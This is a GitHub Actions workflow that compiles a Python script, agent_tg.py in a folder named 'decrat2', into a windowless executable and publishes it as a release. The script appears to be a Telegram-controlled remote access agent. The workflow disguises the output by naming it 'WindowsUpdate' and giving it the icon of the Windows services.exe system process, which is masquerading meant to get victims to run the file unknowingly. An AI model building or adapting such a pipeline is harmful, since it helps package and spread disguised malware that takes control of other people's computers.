name: Build and Release

on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: pip install requests telethon pyinstaller

      - name: Generate service.ico
        working-directory: decrat2
        run: |
          powershell -NoProfile -Command "
            Add-Type -AssemblyName System.Drawing;
            \$icon = [System.Drawing.Icon]::ExtractAssociatedIcon('C:\Windows\System32\services.exe');
            \$icon.Save('service.ico')
          "

      - name: Build EXE
        working-directory: decrat2
        run: |
          pyinstaller --onefile --noconsole --icon=service.ico --name="WindowsUpdate" agent_tg.py

      - name: Get short SHA
        id: sha
        run: echo "short=$(git rev-parse --short HEAD)" >> $env:GITHUB_OUTPUT

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ steps.sha.outputs.short }}
          name: "WindowsUpdate ${{ steps.sha.outputs.short }}"
          files: decrat2/dist/WindowsUpdate.exe
          body: "Auto-build from commit ${{ github.sha }}"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
